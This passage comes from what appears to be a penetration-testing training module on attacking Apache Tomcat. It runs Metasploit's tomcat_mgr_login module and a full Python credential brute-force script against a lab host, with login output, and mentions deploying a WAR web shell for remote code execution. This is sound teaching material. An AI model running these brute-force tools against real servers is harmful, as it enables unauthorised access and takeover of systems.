<a id=__codelineno-5-17 name=__codelineno-5-17 href=#__codelineno-5-17></a><span class=go>/examples (Status: 302)</span>
<a id=__codelineno-5-18 name=__codelineno-5-18 href=#__codelineno-5-18></a><span class=go>/manager (Status: 302)</span>
<a id=__codelineno-5-19 name=__codelineno-5-19 href=#__codelineno-5-19></a><span class=go>Progress: 49959 / 87665 (56.99%)^C</span>
<a id=__codelineno-5-20 name=__codelineno-5-20 href=#__codelineno-5-20></a><span class=go>[!] Keyboard interrupt detected, terminating.</span>
<a id=__codelineno-5-21 name=__codelineno-5-21 href=#__codelineno-5-21></a><span class=go>===============================================================</span>
<a id=__codelineno-5-22 name=__codelineno-5-22 href=#__codelineno-5-22></a><span class=go>2021/09/21 17:44:29 Finished</span>
<a id=__codelineno-5-23 name=__codelineno-5-23 href=#__codelineno-5-23></a><span class=go>===============================================================</span>
</code></pre></div> <p>We may be able to either log in to one of these using weak credentials such as <strong>tomcat:tomcat</strong>, <strong>admin:admin</strong>, etc. If these first few tries don't work, we can try a password brute force attack against the login page. If we are successful in logging in, we can upload a Web Application Resource or <a href="https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web">Web Application ARchive (WAR)</a> file containing a JSP web shell</p> <hr> <h2 id=attacking-tomcat>Attacking Tomcat<a class=headerlink href=#attacking-tomcat title="Permanent link">&para;</a></h2> <p>If we can access the <strong>/manager</strong> or <strong>/host-manager</strong> endpoints, we can likely achieve remote code execution on the Tomcat server.</p> <hr> <h2 id=tomcat-manager-login-brute-force>Tomcat Manager - Login Brute Force<a class=headerlink href=#tomcat-manager-login-brute-force title="Permanent link">&para;</a></h2> <p><div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set VHOST web01.inlanefreight.local</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set RPORT 8180</span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set stop_on_success true</span>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set rhosts 10.129.201.58</span>
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; show options </span>
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a><span class=go>Module options (auxiliary/scanner/http/tomcat_mgr_login):</span>
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a><span class=go>   Name              Current Setting                                                                 Required  Description</span>
<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a><span class=go>   ----              ---------------                                                                 --------  -----------</span>
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a><span class=go>   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users</span>
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a><span class=go>   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5</span>
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a><span class=go>   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database</span>
<a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a><span class=go>   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list</span>
<a id=__codelineno-7-11 name=__codelineno-7-11 href=#__codelineno-7-11></a><span class=go>   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list</span>
<a id=__codelineno-7-12 name=__codelineno-7-12 href=#__codelineno-7-12></a><span class=go>   PASSWORD                                                                                          no        The HTTP password to specify for authentication</span>
<a id=__codelineno-7-13 name=__codelineno-7-13 href=#__codelineno-7-13></a><span class=go>   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line</span>
<a id=__codelineno-7-14 name=__codelineno-7-14 href=#__codelineno-7-14></a><span class=go>   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<a id=__codelineno-7-15 name=__codelineno-7-15 href=#__codelineno-7-15></a><span class=go>   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span>
<a id=__codelineno-7-16 name=__codelineno-7-16 href=#__codelineno-7-16></a><span class=go>   RPORT             8180                                                                            yes       The target port (TCP)</span>
<a id=__codelineno-7-17 name=__codelineno-7-17 href=#__codelineno-7-17></a><span class=go>   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections</span>
<a id=__codelineno-7-18 name=__codelineno-7-18 href=#__codelineno-7-18></a><span class=go>   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host</span>
<a id=__codelineno-7-19 name=__codelineno-7-19 href=#__codelineno-7-19></a><span class=go>   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html</span>
<a id=__codelineno-7-20 name=__codelineno-7-20 href=#__codelineno-7-20></a><span class=go>   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)</span>
<a id=__codelineno-7-21 name=__codelineno-7-21 href=#__codelineno-7-21></a><span class=go>   USERNAME                                                                                          no        The HTTP username to specify for authentication</span>
<a id=__codelineno-7-22 name=__codelineno-7-22 href=#__codelineno-7-22></a><span class=go>   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line</span>
<a id=__codelineno-7-23 name=__codelineno-7-23 href=#__codelineno-7-23></a><span class=go>   USER_AS_PASS      false                                                                           no        Try the username as the password for all users</span>
<a id=__codelineno-7-24 name=__codelineno-7-24 href=#__codelineno-7-24></a><span class=go>   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line</span>
<a id=__codelineno-7-25 name=__codelineno-7-25 href=#__codelineno-7-25></a><span class=go>   VERBOSE           true                                                                            yes       Whether to print output for all attempts</span>
<a id=__codelineno-7-26 name=__codelineno-7-26 href=#__codelineno-7-26></a><span class=go>   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run</span>
<a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a>
<a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a><span class=go>[!] No active DB -- Credential data will not be saved!</span>
<a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)</span>
<a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)</span>
<a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)</span>
<a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)</span>
<a id=__codelineno-8-8 name=__codelineno-8-8 href=#__codelineno-8-8></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)</span>
<a id=__codelineno-8-9 name=__codelineno-8-9 href=#__codelineno-8-9></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)</span>
<a id=__codelineno-8-10 name=__codelineno-8-10 href=#__codelineno-8-10></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)</span>
<a id=__codelineno-8-11 name=__codelineno-8-11 href=#__codelineno-8-11></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)</span>
<a id=__codelineno-8-12 name=__codelineno-8-12 href=#__codelineno-8-12></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)</span>
<a id=__codelineno-8-13 name=__codelineno-8-13 href=#__codelineno-8-13></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)</span>
<a id=__codelineno-8-14 name=__codelineno-8-14 href=#__codelineno-8-14></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)</span>
<a id=__codelineno-8-15 name=__codelineno-8-15 href=#__codelineno-8-15></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)</span>
<a id=__codelineno-8-16 name=__codelineno-8-16 href=#__codelineno-8-16></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)</span>
<a id=__codelineno-8-17 name=__codelineno-8-17 href=#__codelineno-8-17></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)</span>
<a id=__codelineno-8-18 name=__codelineno-8-18 href=#__codelineno-8-18></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)</span>
<a id=__codelineno-8-19 name=__codelineno-8-19 href=#__codelineno-8-19></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)</span>
<a id=__codelineno-8-20 name=__codelineno-8-20 href=#__codelineno-8-20></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)</span>
<a id=__codelineno-8-21 name=__codelineno-8-21 href=#__codelineno-8-21></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)</span>
<a id=__codelineno-8-22 name=__codelineno-8-22 href=#__codelineno-8-22></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)</span>
<a id=__codelineno-8-23 name=__codelineno-8-23 href=#__codelineno-8-23></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)</span>
<a id=__codelineno-8-24 name=__codelineno-8-24 href=#__codelineno-8-24></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)</span>
<a id=__codelineno-8-25 name=__codelineno-8-25 href=#__codelineno-8-25></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)</span>
<a id=__codelineno-8-26 name=__codelineno-8-26 href=#__codelineno-8-26></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)</span>
<a id=__codelineno-8-27 name=__codelineno-8-27 href=#__codelineno-8-27></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)</span>
<a id=__codelineno-8-28 name=__codelineno-8-28 href=#__codelineno-8-28></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)</span>
<a id=__codelineno-8-29 name=__codelineno-8-29 href=#__codelineno-8-29></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)</span>
<a id=__codelineno-8-30 name=__codelineno-8-30 href=#__codelineno-8-30></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)</span>
<a id=__codelineno-8-31 name=__codelineno-8-31 href=#__codelineno-8-31></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)</span>
<a id=__codelineno-8-32 name=__codelineno-8-32 href=#__codelineno-8-32></a><span class=go>[+] 10.129.201.58:8180 - Login Successful: tomcat:admin</span>
<a id=__codelineno-8-33 name=__codelineno-8-33 href=#__codelineno-8-33></a><span class=go>[*] Scanned 1 of 1 hosts (100% complete)</span>
<a id=__codelineno-8-34 name=__codelineno-8-34 href=#__codelineno-8-34></a><span class=go>[*] Auxiliary module execution completed</span>
</code></pre></div> <p>It is important to note that there are many tools available to us as penetration testers. Many exist to make our work more efficient, especially since most penetration tests are "time-boxed" or under strict time constraints. No one tool is better than another, and it does not make us a "bad" penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. Some say, "work smarter, not harder." Why would we make extra work for ourselves during a 40-hour assessment with 1,500 in-scope hosts when we can use a particular tool to help us? It is vital for us to understand <strong>how</strong> our tools work and how to do many things manually.</p> <p>At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment.</p> <p>Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the <strong>PROXIES</strong> option like the following:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set PROXIES HTTP:127.0.0.1:8080</span>
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a>
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a><span class=go>PROXIES =&gt; HTTP:127.0.0.1:8080</span>
<a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a>
<a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a>
<a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a><span class=go>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run</span>
<a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a>
<a id=__codelineno-9-8 name=__codelineno-9-8 href=#__codelineno-9-8></a><span class=go>[!] No active DB -- Credential data will not be saved!</span>
<a id=__codelineno-9-9 name=__codelineno-9-9 href=#__codelineno-9-9></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)</span>
<a id=__codelineno-9-10 name=__codelineno-9-10 href=#__codelineno-9-10></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)</span>
<a id=__codelineno-9-11 name=__codelineno-9-11 href=#__codelineno-9-11></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)</span>
<a id=__codelineno-9-12 name=__codelineno-9-12 href=#__codelineno-9-12></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)</span>
<a id=__codelineno-9-13 name=__codelineno-9-13 href=#__codelineno-9-13></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)</span>
<a id=__codelineno-9-14 name=__codelineno-9-14 href=#__codelineno-9-14></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)</span>
<a id=__codelineno-9-15 name=__codelineno-9-15 href=#__codelineno-9-15></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)</span>
<a id=__codelineno-9-16 name=__codelineno-9-16 href=#__codelineno-9-16></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)</span>
<a id=__codelineno-9-17 name=__codelineno-9-17 href=#__codelineno-9-17></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)</span>
<a id=__codelineno-9-18 name=__codelineno-9-18 href=#__codelineno-9-18></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)</span>
<a id=__codelineno-9-19 name=__codelineno-9-19 href=#__codelineno-9-19></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)</span>
<a id=__codelineno-9-20 name=__codelineno-9-20 href=#__codelineno-9-20></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)</span>
<a id=__codelineno-9-21 name=__codelineno-9-21 href=#__codelineno-9-21></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)</span>
<a id=__codelineno-9-22 name=__codelineno-9-22 href=#__codelineno-9-22></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)</span>
<a id=__codelineno-9-23 name=__codelineno-9-23 href=#__codelineno-9-23></a><span class=go>[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)</span>
</code></pre></div> <p>We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses.</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png></p> <p>A quick check of the value in the <strong>Authorization</strong> header for one request shows that the scanner is running correctly, base64 encoding the credentials <strong>admin:vagrant</strong> the way the Tomcat application would do when a user attempts to log in directly from the web application.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=gp>hrmns@htb[/htb]$ </span><span class=nb>echo</span> <span class=nv>YWRtaW46dmFncmFudA</span><span class=o>==</span> <span class=p>|</span>base64 -d
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=go>admin:vagrant</span>
</code></pre></div> <p>can also use <a href=https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce>this</a> Python script to achieve the same result.</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=ch>#!/usr/bin/python</span>
<a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a>
<a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a><span class=kn>import</span> <span class=nn>requests</span>
<a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a><span class=kn>from</span> <span class=nn>termcolor</span> <span class=kn>import</span> <span class=n>cprint</span>
<a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a><span class=kn>import</span> <span class=nn>argparse</span>
<a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a>
<a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a><span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span> <span class=o>=</span> <span class=s2>&quot;Tomcat manager or host-manager credential bruteforcing&quot;</span><span class=p>)</span>
<a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a>
<a id=__codelineno-11-9 name=__codelineno-11-9 href=#__codelineno-11-9></a><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&quot;-U&quot;</span><span class=p>,</span> <span class=s2>&quot;--url&quot;</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>required</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&quot;URL to tomcat page&quot;</span><span class=p>)</span>
<a id=__codelineno-11-10 name=__codelineno-11-10 href=#__codelineno-11-10></a><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&quot;-P&quot;</span><span class=p>,</span> <span class=s2>&quot;--path&quot;</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>required</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&quot;manager or host-manager URI&quot;</span><span class=p>)</span>
<a id=__codelineno-11-11 name=__codelineno-11-11 href=#__codelineno-11-11></a><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&quot;-u&quot;</span><span class=p>,</span> <span class=s2>&quot;--usernames&quot;</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>required</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&quot;Users File&quot;</span><span class=p>)</span>
<a id=__codelineno-11-12 name=__codelineno-11-12 href=#__codelineno-11-12></a><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&quot;-p&quot;</span><span class=p>,</span> <span class=s2>&quot;--passwords&quot;</span><span class=p>,</span> <span class=nb>type</span> <span class=o>=</span> <span class=nb>str</span><span class=p>,</span> <span class=n>required</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span> <span class=n>help</span> <span class=o>=</span> <span class=s2>&quot;Passwords Files&quot;</span><span class=p>)</span>
<a id=__codelineno-11-13 name=__codelineno-11-13 href=#__codelineno-11-13></a>
<a id=__codelineno-11-14 name=__codelineno-11-14 href=#__codelineno-11-14></a><span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
<a id=__codelineno-11-15 name=__codelineno-11-15 href=#__codelineno-11-15></a>
<a id=__codelineno-11-16 name=__codelineno-11-16 href=#__codelineno-11-16></a><span class=n>url</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>url</span>
<a id=__codelineno-11-17 name=__codelineno-11-17 href=#__codelineno-11-17></a><span class=n>uri</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>path</span>
<a id=__codelineno-11-18 name=__codelineno-11-18 href=#__codelineno-11-18></a><span class=n>users_file</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>usernames</span>
<a id=__codelineno-11-19 name=__codelineno-11-19 href=#__codelineno-11-19></a><span class=n>passwords_file</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>passwords</span>
<a id=__codelineno-11-20 name=__codelineno-11-20 href=#__codelineno-11-20></a>
<a id=__codelineno-11-21 name=__codelineno-11-21 href=#__codelineno-11-21></a><span class=n>new_url</span> <span class=o>=</span> <span class=n>url</span> <span class=o>+</span> <span class=n>uri</span>
<a id=__codelineno-11-22 name=__codelineno-11-22 href=#__codelineno-11-22></a><span class=n>f_users</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>users_file</span><span class=p>,</span> <span class=s2>&quot;rb&quot;</span><span class=p>)</span>
<a id=__codelineno-11-23 name=__codelineno-11-23 href=#__codelineno-11-23></a><span class=n>f_pass</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>passwords_file</span><span class=p>,</span> <span class=s2>&quot;rb&quot;</span><span class=p>)</span>
<a id=__codelineno-11-24 name=__codelineno-11-24 href=#__codelineno-11-24></a><span class=n>usernames</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>f_users</span><span class=p>]</span>
<a id=__codelineno-11-25 name=__codelineno-11-25 href=#__codelineno-11-25></a><span class=n>passwords</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>f_pass</span><span class=p>]</span>
<a id=__codelineno-11-26 name=__codelineno-11-26 href=#__codelineno-11-26></a>
<a id=__codelineno-11-27 name=__codelineno-11-27 href=#__codelineno-11-27></a><span class=n>cprint</span><span class=p>(</span><span class=s2>&quot;</span><span class=se>\n</span><span class=s2>[+] Atacking.....&quot;</span><span class=p>,</span> <span class=s2>&quot;red&quot;</span><span class=p>,</span> <span class=n>attrs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;bold&#39;</span><span class=p>])</span>
<a id=__codelineno-11-28 name=__codelineno-11-28 href=#__codelineno-11-28></a>
<a id=__codelineno-11-29 name=__codelineno-11-29 href=#__codelineno-11-29></a><span class=k>for</span> <span class=n>u</span> <span class=ow>in</span> <span class=n>usernames</span><span class=p>:</span>
<a id=__codelineno-11-30 name=__codelineno-11-30 href=#__codelineno-11-30></a>    <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>passwords</span><span class=p>:</span>
<a id=__codelineno-11-31 name=__codelineno-11-31 href=#__codelineno-11-31></a>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>new_url</span><span class=p>,</span><span class=n>auth</span> <span class=o>=</span> <span class=p>(</span><span class=n>u</span><span class=p>,</span> <span class=n>p</span><span class=p>))</span>
<a id=__codelineno-11-32 name=__codelineno-11-32 href=#__codelineno-11-32></a>
<a id=__codelineno-11-33 name=__codelineno-11-33 href=#__codelineno-11-33></a>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-11-34 name=__codelineno-11-34 href=#__codelineno-11-34></a>            <span class=n>cprint</span><span class=p>(</span><span class=s2>&quot;</span><span class=se>\n</span><span class=s2>[+] Success!!&quot;</span><span class=p>,</span> <span class=s2>&quot;green&quot;</span><span class=p>,</span> <span class=n>attrs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;bold&#39;</span><span class=p>])</span>
<a id=__codelineno-11-35 name=__codelineno-11-35 href=#__codelineno-11-35></a>            <span class=n>cprint</span><span class=p>(</span><span class=s2>&quot;[+] Username : </span><span class=si>{}</span><span class=se>\n</span><span class=s2>[+] Password : </span><span class=si>{}</span><span class=s2>&quot;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>u</span><span class=p>,</span><span class=n>p</span><span class=p>),</span> <span class=s2>&quot;green&quot;</span><span class=p>,</span> <span class=n>attrs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;bold&#39;</span><span class=p>])</span>
<a id=__codelineno-11-36 name=__codelineno-11-36 href=#__codelineno-11-36></a>            <span class=k>break</span>
<a id=__codelineno-11-37 name=__codelineno-11-37 href=#__codelineno-11-37></a>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-11-38 name=__codelineno-11-38 href=#__codelineno-11-38></a>        <span class=k>break</span>
<a id=__codelineno-11-39 name=__codelineno-11-39 href=#__codelineno-11-39></a>
<a id=__codelineno-11-40 name=__codelineno-11-40 href=#__codelineno-11-40></a><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-11-41 name=__codelineno-11-41 href=#__codelineno-11-41></a>    <span class=n>cprint</span><span class=p>(</span><span class=s2>&quot;</span><span class=se>\n</span><span class=s2>[+] Failed!!&quot;</span><span class=p>,</span> <span class=s2>&quot;red&quot;</span><span class=p>,</span> <span class=n>attrs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;bold&#39;</span><span class=p>])</span>
<a id=__codelineno-11-42 name=__codelineno-11-42 href=#__codelineno-11-42></a>    <span class=n>cprint</span><span class=p>(</span><span class=s2>&quot;[+] Could not Find the creds :( &quot;</span><span class=p>,</span> <span class=s2>&quot;red&quot;</span><span class=p>,</span> <span class=n>attrs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;bold&#39;</span><span class=p>])</span>
<a id=__codelineno-11-43 name=__codelineno-11-43 href=#__codelineno-11-43></a><span class=c1>#print r.status_code</span>
</code></pre></div> We can try out the script with the default Tomcat users and passwords file that the above Metasploit module uses.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=gp>hrmns@htb[/htb]$ </span>python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
<a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a>
<a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a><span class=go>[+] Atacking.....</span>
<a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a>
<a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a><span class=go>[+] Success!!</span>
<a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a><span class=go>[+] Username : b&#39;tomcat&#39;</span>
<a id=__codelineno-12-7 name=__codelineno-12-7 href=#__codelineno-12-7></a><span class=go>[+] Password : b&#39;admin&#39;</span>
